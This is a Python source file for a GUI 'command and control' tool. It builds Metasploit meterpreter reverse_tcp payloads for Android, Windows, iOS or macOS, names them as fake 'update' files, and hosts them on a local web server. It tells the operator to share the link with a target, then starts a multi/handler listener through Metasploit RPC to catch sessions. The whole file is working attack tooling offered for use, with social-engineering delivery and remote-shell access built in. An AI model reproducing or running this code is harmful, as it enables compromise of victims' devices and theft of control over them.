import os
import socket
import threading
import http.server
import socketserver
import customtkinter as ctk
from tkinter import messagebox
import subprocess
from pymetasploit3.msfrpc import MsfRpcClient

class UltimateControllerGUI(ctk.CTk):
    def __init__(self):
        super().__init__()

        # --- Setup ---
        self.title("⚡ Elite Command & Control")
        self.geometry("700x950")
        ctk.set_appearance_mode("Dark")
        
        self.server_port = 8080
        self.is_hosting = False
        self.msf_client = None

        # --- UI Header & Toggle ---
        self.header_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.header_frame.pack(fill="x", padx=20, pady=5)
        self.mode_switch = ctk.CTkSwitch(self.header_frame, text="Dark Mode", command=self.change_mode)
        self.mode_switch.select()
        self.mode_switch.pack(side="right")

        self.title_label = ctk.CTkLabel(self, text="C2 COMMAND CENTER", font=("Orbitron", 30, "bold"), text_color="#3498db")
        self.title_label.pack(pady=10)

        # --- Input Section ---
        self.main_frame = ctk.CTkFrame(self, corner_radius=15)
        self.main_frame.pack(fill="x", padx=30, pady=10)

        self.target_var = ctk.StringVar(value="Android")
        self.target_menu = ctk.CTkOptionMenu(self.main_frame, values=["Android", "Windows", "iOS", "macOS"], variable=self.target_var, width=200)
        self.target_menu.pack(pady=10)

        self.entry_ip = ctk.CTkEntry(self.main_frame, placeholder_text="LHOST", width=300, height=40)
        self.entry_ip.insert(0, self.get_my_ip())
        self.entry_ip.pack(pady=5)

        self.entry_port = ctk.CTkEntry(self.main_frame, placeholder_text="LPORT", width=300, height=40)
        self.entry_port.insert(0, "4444")
        self.entry_port.pack(pady=5)

        # --- Control Buttons ---
        self.btn_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.btn_frame.pack(pady=10)

        self.btn_gen = ctk.CTkButton(self.btn_frame, text="🚀 Build & Host Link", command=self.build_and_host, fg_color="#e67e22", width=250, height=45)
        self.btn_gen.grid(row=0, column=0, padx=10)

        self.btn_listen = ctk.CTkButton(self.btn_frame, text="🎧 Start Live Listener", command=self.start_msf_handler, fg_color="#27ae60", width=250, height=45)
        self.btn_listen.grid(row=0, column=1, padx=10)

        # --- Live Console (Session Management) ---
        ctk.CTkLabel(self, text="LIVE SESSION LOGS", font=("Arial", 12, "bold")).pack(pady=(10,0))
        self.console = ctk.CTkTextbox(self, height=250, width=640, fg_color="black", text_color="#00FF00", font=("Consolas", 12))
        self.console.pack(pady=10, padx=30)
        self.console.insert("0.0", "System: Waiting for command...\n")

    def log(self, msg):
        self.console.insert("end", f"> {msg}\n")
        self.console.see("end")

    def change_mode(self):
        ctk.set_appearance_mode("Dark" if self.mode_switch.get() == 1 else "Light")

    def get_my_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try: s.connect(("8.8.8.8", 80)); return s.getsockname()[0]
        except: return "127.0.0.1"
        finally: s.close()

    def build_and_host(self):
        target = self.target_var.get()
        lhost = self.entry_ip.get()
        lport = self.entry_port.get()
        ext = {"Android": "apk", "Windows": "exe", "iOS": "macho", "macOS": "macho"}[target]
        filename = f"update_{target.lower()}.{ext}"
        
        self.log(f"Building {target} payload...")
        cmd = f"msfvenom -p {target.lower()}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}"
        
        try:
            subprocess.Popen(cmd, shell=True)
            url = f"http://{lhost}:{self.server_port}/{filename}"
            self.log(f"Link Live: {url}")
            if not self.is_hosting:
                threading.Thread(target=self.start_web_server, daemon=True).start()
            messagebox.showinfo("Ready", f"Share this link with target:\n{url}")
        except Exception as e: self.log(f"Error: {e}")

    def start_web_server(self):
        handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", self.server_port), handler) as httpd:
            self.is_hosting = True
            httpd.serve_forever()

    def start_msf_handler(self):
        """Metasploit RPC ke through listener start karein"""
        lhost = self.entry_ip.get()
        lport = int(self.entry_port.get())
        target = self.target_var.get().lower()

        def run_rpc():
            try:
                self.log("Connecting to MSF RPC...")
                client = MsfRpcClient('1234', port=55553) # msfrpcd password check
                self.log("Connected! Starting Multi-Handler...")
                
                handler = client.modules.use('exploit', 'multi/handler')
                handler['PAYLOAD'] = f"{target}/meterpreter/reverse_tcp"
                handler['LHOST'] = lhost
                handler['LPORT'] = lport
                handler.execute(payload=f"{target}/meterpreter/reverse_tcp")
                
                self.log(f"Listener active on {lhost}:{lport}")
                self.log("Waiting for sessions... (Keep GUI Open)")
                
                # Session check loop (Optional logic to auto-alert)
                while True:
                    sessions = client.sessions.list
                    if sessions:
                        self.log(f"ALERT: New session found! Count: {len(sessions)}")
                        break
            except Exception as e:
                self.log(f"RPC Error: Is msfrpcd running? {e}")

        threading.Thread(target=run_rpc, daemon=True).start()

if __name__ == "__main__":
    app = UltimateControllerGUI()
    app.mainloop()
